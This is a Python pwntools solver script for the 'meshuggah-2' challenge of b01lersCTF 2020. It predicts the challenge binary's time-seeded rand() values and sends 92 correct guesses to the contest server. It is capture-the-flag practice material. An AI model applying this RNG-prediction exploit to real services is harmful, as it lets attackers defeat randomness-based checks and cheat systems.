#!/usr/bin/python
from pwn import *

chdir = '/MOUNT/contest/b01lersCTF-2020/meshuggah-2/'
config = {
        'elf': chdir + 'meshuggah',
        'libc': chdir + 'libc.so.6',
        'HOST': 'pwn.ctf.b01lers.com',
        'PORT': 1003
        }

INPUT_PROMPT = 'Which model starship would you like to buy?'

def exploit(r, c):
    for i in range(92):
        r.sendlineafter(INPUT_PROMPT, str(c.rand()))
        r.recvuntil("You're a smart one, picking the one on sale!")
        log.info('count = {}'.format(i+4))
    print r.recvall()

if __name__ == '__main__':
    if "elf" in config.keys() and config["elf"]:
        e = ELF(config["elf"])
    if "libc" in config.keys() and config["libc"]:
        libc = ELF(config["libc"])

    c = elf.ctypes.CDLL(config['libc'])
    context.log_level = 'debug'
    
    import time
    if len(sys.argv) > 1:
        r = remote(config["HOST"], config["PORT"])
    else:
        context.terminal=['tmux', 'splitw', '-h']
        cmd = ['./ld-linux-x86-64.so.2', '--library-path', chdir, e.path]
        r = process(cmd)
    t = int(time.time()) + 2
    c.srand(t)
    print c.rand()
    print c.rand()
    print c.rand()
    exploit(r, c)

